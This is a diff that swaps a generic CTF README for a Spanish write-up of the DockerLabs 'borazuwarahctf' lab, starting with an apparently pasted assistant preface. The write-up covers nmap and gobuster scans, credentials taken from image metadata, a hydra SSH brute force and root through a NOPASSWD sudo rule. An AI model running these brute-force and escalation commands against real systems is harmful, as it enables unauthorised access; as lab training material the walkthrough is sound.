@@ -1,40 +1,104 @@
-# Borazuwarah CTF
+Aquí tienes el texto optimizado en Markdown. He corregido la numeración de secciones, mejorado la estructura de tablas, eliminado redundancias, estandarizado comandos y emojis para mayor claridad, y asegurado un flujo lógico sin repetir contenido.
 
-## Description
+🛡️ Writeup – borazuwarahctf (Dockers Labs)
+Este documento detalla el proceso de resolución del desafío borazuwarahctf en Dockers Labs, desde el análisis inicial hasta el acceso root.
 
-This challenge consists of exploiting a vulnerable Docker application to gain access to a limited shell. The goal is to retrieve a flag located in a specific directory.
+1️⃣ Información General
+Campo	Información
+Nombre	borazuwarahctf
+Dificultad	Muy Fácil
+IP objetivo	172.17.0.2
+Plataforma	Dockers Labs
+🎯 Objetivo
+Obtener acceso al sistema mediante reconocimiento, enumeración y explotación, y escalar privilegios a root. Metodología: Reconocimiento → Enumeración → Identificación de ataque → Explotación → Escalada.
 
-## Requirements
+2️⃣ Reconocimiento
+Usamos Nmap para identificar puertos y servicios.
 
-- Docker installed on your machine
-- Basic knowledge of command-line interface
+bash
+nmap -sC -sV -oN escaneoInicial.txt 172.17.0.2
+Resultados clave:
 
-## Steps to Solve
+Puerto	Servicio	Versión
+22/tcp	SSH	OpenSSH 9.2p1 Debian
+80/tcp	HTTP	Apache 2.4.59 (Debian)
+Interpretación: SSH para acceso remoto y Apache en web. Priorizamos el servicio web (puerto 80).
 
-1. **Pull the Docker Image**: Use the following command to pull the Docker image:
-   ```bash
-   docker pull vulnerable_docker_image
-   ```
+3️⃣ Análisis del Servicio Web
+Accediendo a http://172.17.0.2, solo aparece una imagen de un huevo Kinder Sorpresa, sin formularios, login ni scripts visibles.
 
-2. **Run the Docker Container**: Start the container with the command:
-   ```bash
-   docker run -d -p 8080:80 vulnerable_docker_image
-   ```
+Hipótesis: Posibles metadatos ocultos, esteganografía o archivos escondidos. Procedemos a enumeración.
 
-3. **Access the Application**: Open your browser and go to `http://localhost:8080`
+4️⃣ Enumeración Web
+Usamos Gobuster para directorios y archivos.
 
-4. **Exploit the Vulnerability**: Analyze the application to find the vulnerability and exploit it.
+bash
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt
+Resultados:
 
-5. **Retrieve the Flag**: Once you gain access to the shell, navigate to the desired directory and retrieve the flag using:
-   ```bash
-   cat /path/to/flag.txt
-   ```
+Ruta	Status
+.htaccess	403
+.htpasswd	403
+index.html	200
+server-status	403
+No hay rutas explotables. Enfocamos la imagen de index.html.
 
-## Conclusion
+5️⃣ Análisis de la Imagen
+Descargamos imagen.jpeg y extraemos metadatos con ExifTool:
 
-With the completion of this challenge, you should have a good understanding of exploiting Docker containers.
+bash
+exiftool imagen.jpeg
+Resultados clave:
 
-## Additional Resources
+Description: ---------- User: borazuwarah ----------
 
-- [Docker Documentation](https://docs.docker.com)
-- [CTF Writeups](https://ctf-writeups.com)
+Title: ---------- Password: ----------
+
+Credenciales: borazuwarah / **** (contraseña oculta en metadatos).
+
+6️⃣ Ataque al Servicio SSH
+Fuerza bruta con Hydra usando la lista claves.txt:
+
+bash
+hydra -l borazuwarah -P claves.txt ssh://172.17.0.2 -I -f
+Resultado: borazuwarah:123456
+
+7️⃣ Acceso al Sistema
+bash
+ssh borazuwarah@172.17.0.2
+bash
+whoami
+# borazuwarah
+Acceso confirmado como borazuwarah.
+
+8️⃣ Escalada de Privilegios
+bash
+sudo -l
+# (ALL) NOPASSWD: /bin/bash
+Explotación:
+
+bash
+sudo bash
+whoami
+# root
+Acceso root obtenido.
+
+9️⃣ Conclusión
+🔴 Vulnerabilidades
+Vulnerabilidad	Impacto
+Credenciales en metadatos	Filtración sensible
+Falta de revisión de archivos	Exposición de datos
+Configuración insegura de sudo	Escalada directa a root
+⛓️ Cadena de Ataque
+Reconocimiento (Nmap) → Análisis web → Imagen → Metadatos → Credenciales → SSH → Sudo → ROOT.
+
+📚 Lecciones
+Revisa metadatos antes de publicar archivos.
+
+No almacenes credenciales en públicos.
+
+Aplica mínimo privilegio y configura sudo correctamente.
+
+✍️ Autor: Raúl Bustamante
+🎓 Ingeniería Informática
+🔐 Intereses: Ciberseguridad, Pentesting, CTF
